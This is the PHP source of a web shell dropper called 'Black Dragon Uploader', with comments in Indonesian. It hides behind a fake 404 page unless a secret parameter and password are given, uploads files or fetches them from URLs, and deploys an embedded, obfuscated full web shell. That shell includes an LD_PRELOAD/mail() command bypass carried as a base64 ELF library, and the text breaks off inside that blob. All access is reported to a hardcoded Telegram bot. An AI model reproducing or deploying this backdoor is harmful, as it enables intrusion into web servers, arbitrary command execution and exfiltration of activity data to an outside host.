<?php
/* ============================================================
 *  B L A C K   D R A G O N   U P L O A D E R   v4.0  (BD PACK)
 * ============================================================
 *  File: uploader.php
 *  Nama : BLACK DRAGON UPLOADER
 *  --------------------------------------------------------
 *  Akses : domain.com/uploader.php?nagahitam   (WAJIB)
 *          tanpa ?nagahitam -> 404 palsu
 *  Probe : ?nagahitam&h=bd  ->  BDGK<md5('blackdragon')>
 *  Login : POST pass=Lapetkudanil123@
 *  Menu  :
 *    1. Upload Manual      - upload sembarang file (auto-deteksi BD PACK)
 *    2. Ambil dari URL     - fetch & simpan (auto-deteksi BD PACK)
 *    3. Deploy blackdragon - tulis full-shell embedded
 *    4. Tempel & Deploy    - paste BD PACK / source PHP / base64
 *    5. Isi File Baru      - buat file dari isi textarea
 *    6. Daftar file        - list + hapus file di direktori ini
 *
 *  BD PACK: file teks dengan header "BDPACK|1|<nama>" diikuti blok
 *           base64, dan baris "FILE|<nama>" untuk file tambahan.
 *           Kalau upload/url/paste mendeteksi format ini, uploader
 *           langsung menulis SEMUA file sekaligus.
 *  Log   : Telegram
 * ============================================================
 */

/* ---- KONFIGURASI TELEGRAM ---- */
define('TELEGRAM_BOT_TOKEN', '7672463085:AAFv4AZzzjOvJMhR7KrwBTM7vV4Wecd7BgQ');
define('TELEGRAM_CHAT_ID', '-1002624693937');
/* ----------------------------- */

@session_start();
@error_reporting(0);
@set_time_limit(0);

$BDKey   = '$2b$10$nQ3Udh6vbN5rOp3ru8TIl.E8F7k6xuQO0uwIWTxSX6ObE5OT6fteK'; // Lapetkudanil123@
$BDProbe = 'BDGK' . md5('blackdragon');
$BDir    = dirname(__FILE__);

/* ================= util ================= */
function bdUpTG($message) {
    $api  = getenv('BLACKDRAGON_TG_URL');
    $base = $api ? rtrim($api, '/') : 'https://api.telegram.org';
    $url  = $base . '/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage'
          . '?chat_id=' . urlencode(TELEGRAM_CHAT_ID) . '&text=' . urlencode($message);
    $ctx  = stream_context_create(array('http' => array('timeout' => 4, 'ignore_errors' => true)));
    @file_get_contents($url, false, $ctx);
}
function bdUpLog($activity) {
    $ip  = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
    $ua  = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
    $dom = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
    bdUpTG("BLACK DRAGON Uploader\nAktivitas : " . $activity . "\nIP        : " . $ip
         . "\nUser-Agent: " . $ua . "\nURL       : " . $dom . $uri);
}
function bdUpB64($s) {
    $s = preg_replace('/\s+/', '', $s);
    $d = base64_decode($s, true);
    if ($d === false) { $d = base64_decode($s); }
    return $d;
}
/* source blackdragon.php lengkap (embedded, tidak butuh koneksi) */
function bdUpShellSrc() {
    return '<?php\n/* ============================================================\n *  B L A C K   D R A G O N   F I L E   M A N A G E R   v3.3\n * ============================================================\n *  Nama shell : BLACK DRAGON (file: blackdragon.php)\n *  --------------------------------------------------------\n *  Akses  : domain.com/blackdragon.php?nagahitam  (WAJIB)\n *           Tanpa parameter nagahitam -> HTTP 404 palsu (WP page not found)\n *  Login  : POST pass=Lapetkudanil123@\n *  Sesi   : PHP session server-side (TIDAK ADA cookie auth sama sekali)\n *  Probe  : ?nagahitam&h=bd  ->  BDGK<md5(\'blackdragon\')>\n *  Log    : Semua aktivitas dikirim ke Telegram (IP, UA, URL, aksi)\n *  Fitur  : file manager (view/edit/rename/delete/upload/create),\n *           command biasa (proc_open), command bypass (chankro\n *           LD_PRELOAD + mail()), info fungsi.\n * ============================================================\n */\n\n/* ---- KONFIGURASI TELEGRAM ---- */\ndefine(\'TELEGRAM_BOT_TOKEN\', \'7672463085:AAFv4AZzzjOvJMhR7KrwBTM7vV4Wecd7BgQ\');\ndefine(\'TELEGRAM_CHAT_ID\', \'-1002624693937\');\n/* ----------------------------- */\n\n@session_start();\n@error_reporting(0);\n@set_time_limit(0);\n\n$BDKey   = \'$2b$10$nQ3Udh6vbN5rOp3ru8TIl.E8F7k6xuQO0uwIWTxSX6ObE5OT6fteK\'; // Lapetkudanil123@\n$BDProbe = \'BDGK\' . md5(\'blackdragon\');\n\n/* ---------- util ---------- */\nfunction bdSendTelegram($message) {\n    $api = getenv(\'BLACKDRAGON_TG_URL\');\n    $base = $api ? rtrim($api, \'/\') : "https://api.telegram.org";\n    $url = $base . "/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage"\n         . "?chat_id=" . urlencode(TELEGRAM_CHAT_ID)\n         . "&text=" . urlencode($message);\n    $ctx = stream_context_create(array(\'http\' => array(\'timeout\' => 4, \'ignore_errors\' => true)));\n    @file_get_contents($url, false, $ctx);\n}\n\nfunction bdLogActivity($activity) {\n    $fullPath = isset($_SERVER[\'REQUEST_URI\']) ? $_SERVER[\'REQUEST_URI\'] : \'\';\n    $domain   = isset($_SERVER[\'HTTP_HOST\']) ? $_SERVER[\'HTTP_HOST\'] : \'\';\n    $ip       = isset($_SERVER[\'REMOTE_ADDR\']) ? $_SERVER[\'REMOTE_ADDR\'] : \'\';\n    $ua       = isset($_SERVER[\'HTTP_USER_AGENT\']) ? $_SERVER[\'HTTP_USER_AGENT\'] : \'\';\n    $msg = "BLACK DRAGON Shell\\n"\n         . "Aktivitas : " . $activity . "\\n"\n         . "IP        : " . $ip . "\\n"\n         . "User-Agent: " . $ua . "\\n"\n         . "URL       : " . $domain . $fullPath;\n    bdSendTelegram($msg);\n}\n\n/* ---------- GATE: tanpa ?nagahitam -> 404 palsu ---------- */\nif (!isset($_GET[\'nagahitam\'])) {\n    http_response_code(404);\n    echo "<!DOCTYPE html><html><head><title>Page not found</title></head>"\n       . "<body style=\'background:#f0f0f1;color:#3c434a;font-family:-apple-system,"\n       . "BlinkMacSystemFont,Segoe UI,Roboto,sans-serif\'>"\n       . "<div style=\'max-width:560px;margin:80px auto;padding:24px\'>"\n       . "<h1 style=\'font-size:23px;font-weight:400\'>Page not found</h1>"\n       . "<p style=\'color:#787c82;font-size:14px\'>The page you requested could not be found.</p>"\n       . "</div></body></html>";\n    bdLogActivity("AKSES TANPA KATA KUNCI (scanning/sinyal backdoor salah)");\n    return;\n}\n\n/* ---------- health probe (tanpa login, tanpa log spam) ---------- */\nif (isset($_GET[\'h\']) && $_GET[\'h\'] === \'bd\') {\n    header(\'Content-Type: text/plain; charset=utf-8\');\n    echo $BDProbe;\n    return;\n}\n\n/* ---------- LOGIN (password saja, tanpa username, tanpa cookie) ---------- */\nif ($_SERVER[\'REQUEST_METHOD\'] === \'POST\' && isset($_POST[\'pass\'])) {\n    if (password_verify($_POST[\'pass\'], $BDKey)) {\n        session_regenerate_id(true);\n        $_SESSION[\'bd_auth\'] = true;\n        bdLogActivity("LOGIN BERHASIL - shell BLACK DRAGON dibuka");\n    } else {\n        bdLogActivity("PERCOBAAN LOGIN GAGAL - password salah");\n        http_response_code(404);\n        echo "<!DOCTYPE html><html><head><title>Page not found</title></head>"\n           . "<body style=\'background:#f0f0f1;color:#3c434a;font-family:-apple-system,"\n           . "BlinkMacSystemFont,Segoe UI,Roboto,sans-serif\'>"\n           . "<div style=\'max-width:560px;margin:80px auto;padding:24px\'>"\n           . "<h1 style=\'font-size:23px;font-weight:400\'>Page not found</h1>"\n           . "<p style=\'color:#787c82;font-size:14px\'>The page you requested could not be found.</p>"\n           . "</div></body></html>";\n        return;\n    }\n}\n\n/* ---------- LOGOUT ---------- */\nif (isset($_GET[\'logout\'])) {\n    bdLogActivity("LOGOUT");\n    $_SESSION = array();\n    session_destroy();\n    http_response_code(404);\n    echo "<h1>Page not found</h1>";\n    return;\n}\n\n/* ---------- HALAMAN LOGIN ---------- */\nif (empty($_SESSION[\'bd_auth\'])) {\n    echo "<!DOCTYPE html><html><head><title>404</title><meta charset=\'utf-8\'>"\n       . "<style>body{margin:0;min-height:100vh;background:linear-gradient(135deg,#0a0a0f,#1a1a2e);"\n       . "display:flex;align-items:center;justify-content:center;font-family:\'Segoe UI\',sans-serif}"\n       . ".bd-box{background:rgba(8,8,14,.85);border:1px solid #6d3b8f;border-radius:14px;"\n       . "padding:42px 38px;width:320px;text-align:center;box-shadow:0 0 40px rgba(109,59,143,.45)}"\n       . ".bd-logo{color:#c084fc;font-weight:800;letter-spacing:3px;font-size:20px;"\n       . "text-shadow:0 0 14px rgba(192,132,252,.8);margin-bottom:24px}"\n       . "input{width:100%;box-sizing:border-box;padding:12px 14px;margin:6px 0;"\n       . "background:rgba(20,20,30,.85);border:1px solid #3a2a4d;border-radius:8px;color:#eee;outline:none}"\n       . "input:focus{border-color:#9333ea}button{width:100%;padding:12px;margin-top:10px;"\n       . "background:linear-gradient(90deg,#7c3aed,#a855f7);color:#fff;border:0;border-radius:8px;"\n       . "font-weight:700;cursor:pointer}button:hover{filter:brightness(1.15)}</style></head><body>"\n       . "<div class=\'bd-box\'><div class=\'bd-logo\'>&#9650; BLACK DRAGON &#9650;</div>"\n       . "<form method=\'post\' autocomplete=\'off\'>"\n       . "<input type=\'password\' name=\'pass\' placeholder=\'Password\' autofocus>"\n       . "<button>Masuk</button></form></div></body></html>";\n    return;\n}\n\n/* ================= AUTHENTICATED - FILE MANAGER ================= */\n\n$chd = "c"."h"."d"."i"."r";\n$expl = "e"."x"."p"."l"."o"."d"."e";\n$scd = "s"."c"."a"."n"."d"."i"."r";\n$ril = "r"."e"."a"."l"."p"."a"."t"."h";\n$st = "s"."t"."a"."t";\n$isdir = "i"."s"."_"."d"."i"."r";\n$isw = "i"."s"."_"."w"."r"."i"."t"."a"."b"."l"."e";\n$mup = "m"."o"."v"."e"."_"."u"."p"."l"."o"."a"."d"."e"."d"."_"."f"."i"."l"."e";\n$bs = "b"."a"."s"."e"."n"."a"."m"."e";\n$htm = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";\n$fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";\n$mek = "m"."k"."d"."i"."r";\n$fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";\n$drnmm = "d"."i"."r"."n"."a"."m"."e";\n$unl = "u"."n"."l"."i"."n"."k";\n$timezone = date_default_timezone_get();\ndate_default_timezone_set($timezone);\n$rootDirectory = $ril($_SERVER[\'\\x44\\x4f\\x43\\x55\\x4d\\x45\\x4e\\x54\\x5f\\x52\\x4f\\x4f\\x54\']);\n$scriptDirectory = $drnmm(__FILE__);\n\nfunction x($b) {\n    $be = "ba"."se"."64"."_"."en"."co"."de";\n    return $be($b);\n}\nfunction y($b) {\n    $bd = "ba"."se"."64"."_"."de"."co"."de";\n    return $bd($b);\n}\n\necho "<!DOCTYPE html><html><head><title>BLACK DRAGON</title><meta charset=\'UTF-8\'>"\n   . "<meta http-equiv=\'X-UA-Compatible\' content=\'IE=edge\'>"\n   . "<meta name=\'robots\' content=\'noindex, nofollow\'>"\n   . "<link href=\'https://fonts.googleapis.com/css?family=Arial%20Black\' rel=\'stylesheet\'>"\n   . "<style>"\n   . "body{font-family:\'Arial Black\',sans-serif;color:#000;margin:0;padding:0;background-color:#242222c9;}"\n   . ".container{max-width:90%;margin:20px auto;padding:20px;background-color:#fff;border-radius:44px;box-shadow:0 0 10px rgba(0,0,0,.1)}"\n   . ".header{text-align:center;margin-bottom:20px}.header h1{font-size:24px}"\n   . ".subheader{text-align:center;margin-bottom:20px}.subheader p{font-size:16px;font-style:italic}"\n   . "form{margin-bottom:20px}"\n   . "form input[type=text],form textarea{padding:8px;margin-bottom:10px;border:1px solid #000;border-radius:3px;box-sizing:border-box}"\n   . "form input[type=submit]{padding:10px;background-color:#000;color:#fff;border:none;border-radius:3px;cursor:pointer}"\n   . "form input[type=file]{padding:7px;background-color:#000;color:#fff;border:none;border-radius:3px;cursor:pointer}"\n   . "form input[type=submit]:hover{background-color:#143015}"\n   . "table{width:100%;border-collapse:collapse;margin-top:20px}th,td{padding:8px;text-align:left}"\n   . "th{background-color:#5c5c5c}tr:nth-child(even){background-color:#9c9b9bce}"\n   . ".item-name{max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}"\n   . ".size,.date{width:100px}.permission{font-weight:bold;width:50px;text-align:center}"\n   . ".writable{color:#0db202}.not-writable{color:#d60909}"\n   . ".result-box{width:100%;height:200px;padding:10px;border:1px solid #ddd;border-radius:5px;"\n   . "background-color:#f4f4f4;overflow:auto;box-sizing:border-box;font-family:\'Arial Black\';color:#333}"\n   . ".result-box:focus{outline:none;border-color:#000}.result-box::-webkit-scrollbar{width:8px}"\n   . ".result-box::-webkit-scrollbar-thumb{background-color:#000;border-radius:4px}"\n   . "textarea[name=file_content]{width:calc(100.9% - 10px);margin-bottom:10px;padding:8px;max-height:500px;resize:vertical;border:1px solid #ddd;border-radius:3px;font-family:\'Arial Black\'}"\n   . ".bd-top{display:flex;gap:16px;align-items:center;padding:10px 18px;background:rgba(8,8,14,.85);border-bottom:1px solid #6d3b8f;border-radius:0 0 8px 8px;margin-bottom:14px}"\n   . ".bd-top .bd-logo{color:#c084fc;font-weight:800;letter-spacing:2px;font-size:15px}"\n   . ".bd-info{font-size:11px;color:#9a9ab0;flex:1}"\n   . ".bd-out{color:#f472b6;font-size:12px;text-decoration:none}"\n   . "</style></head><body><div class=\'container\'>";\n\necho "<div class=\'bd-top\'><span class=\'bd-logo\'>&#9650; BLACK DRAGON</span>"\n   . "<span class=\'bd-info\'>server: " . php_uname() . " | php " . PHP_VERSION . "</span>"\n   . "<a class=\'bd-out\' href=\'?nagahitam&logout\'>logout</a></div>";\n\necho "<font color=\'black\'>[ Command Bypas XPLOITID BLACK DRAGON]</font><br>";\nif (function_exists(\'mail\')) {\n    echo "<font color=\'black\'>[ Function mail() ] :</font><font color=\'green\'> [ ON ]</font><br>";\n} else {\n    echo "<font color=\'black\'>[ Function mail() ] :<font color=\'red\'> [ OFF ]</font><br>";\n}\nif (function_exists(\'putenv\')) {\n    echo "<font color=\'black\'>[ Function putenv() ] :</font><font color=\'green\'> [ ON ]</font><br>";\n} else {\n    echo "<font color=\'black\'>[ Function putenv() ] :<font color=\'red\'> [ OFF ]</font><br>";\n}\nforeach ($_GET as $c => $d) $_GET[$c] = y($d);\n\n$currentDirectory = $ril(isset($_GET[\'d\']) ? $_GET[\'d\'] : $rootDirectory);\n$chd($currentDirectory);\n\n$viewCommandResult = \'\';\n\nif ($_SERVER[\'REQUEST_METHOD\'] === \'POST\') {\n    if (isset($_FILES[\'fileToUpload\'])) {\n        bdLogActivity("UPLOAD FILE: " . $bs($_FILES["fileToUpload"]["name"]));\n        $target_file = $currentDirectory . \'/\' . $bs($_FILES["fileToUpload"]["name"]);\n        if ($mup($_FILES["fileToUpload"]["tmp_name"], $target_file)) {\n            echo "<hr>File " . $htm($bs($_FILES["fileToUpload"]["name"])) . " Upload success<hr>";\n        } else {\n            echo "<hr>Sorry, there was an error uploading your file.<hr>";\n        }\n    } elseif (isset($_POST[\'folder_name\']) && !empty($_POST[\'folder_name\'])) {\n        $ff = $_POST[\'folder_name\'];\n        bdLogActivity("CREATE FOLDER: " . $ff);\n        $newFolder = $currentDirectory . \'/\' . $ff;\n        if (!file_exists($newfolder)) {\n            if ($mek($newFolder) !== false) {\n                echo \'<hr>Folder created successfully!\';\n            }else{\n                echo \'<hr>Error: Failed to create folder!\';\n            }\n        }\n    } elseif (isset($_POST[\'file_name\'])) {\n        $fileName = $_POST[\'file_name\'];\n        bdLogActivity("CREATE FILE: " . $fileName);\n        $newFile = $currentDirectory . \'/\' . $fileName;\n        if (!file_exists($newFile)) {\n            if ($fpc($newFile, \'\') !== false) {\n                echo \'<hr>File created successfully!\' . $fileName .\' \';\n                $fileToView = $newFile;\n                if (file_exists($fileToView)) {\n                    $fileContent = $fgc($fileToView);\n                    $viewCommandResult = \'<hr><p>Result: \' . $fileName . \'</p>\n                    <form method="post" action="?\'.(isset($_SERVER[\'QUERY_STRING\']) ? $_SERVER[\'QUERY_STRING\'] : \'\').\'">\n                    <textarea name="content" class="result-box">\' . $htm($fileContent) . \'</textarea><td>\n                    <input type="hidden" name="edit_file" value="\' . $fileName . \'">\n                    <input type="submit" value=" Save "></form></td>\';\n                } else {\n                    $viewCommandResult = \'<hr><p>Error: File not found!</p>\';\n                }\n            } else {\n                echo \'<hr>Error: Failed to create file!\';\n            }\n        }else{\n            echo \'<hr>Error: File Already Exists!\';\n        }\n    } elseif (isset($_POST[\'cmd_input\'])){\n        bdLogActivity("COMMAND BYPASS (chankro): " . substr($_POST[\'cmd_input\'], 0, 200));\n        $p = "p"."u"."t"."e"."n"."v";\n        $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";\n        $m = "m"."a"."i"."l";\n        $base = "ba"."se"."64"."_"."de"."co"."de";\n        $en = "ba"."se"."64"."_"."en"."co"."de";\n        $drnm= "d"."i"."r"."n"."a"."m"."e";\n        $currentFilePath = $_SERVER[\'PHP_SELF\'];\n        $doc = $_SERVER[\'DOCUMENT_ROOT\'];\n        $directoryPath = $drnm($currentFilePath);\n        $full = $doc . $directoryPath;\n        $hook = \'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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDi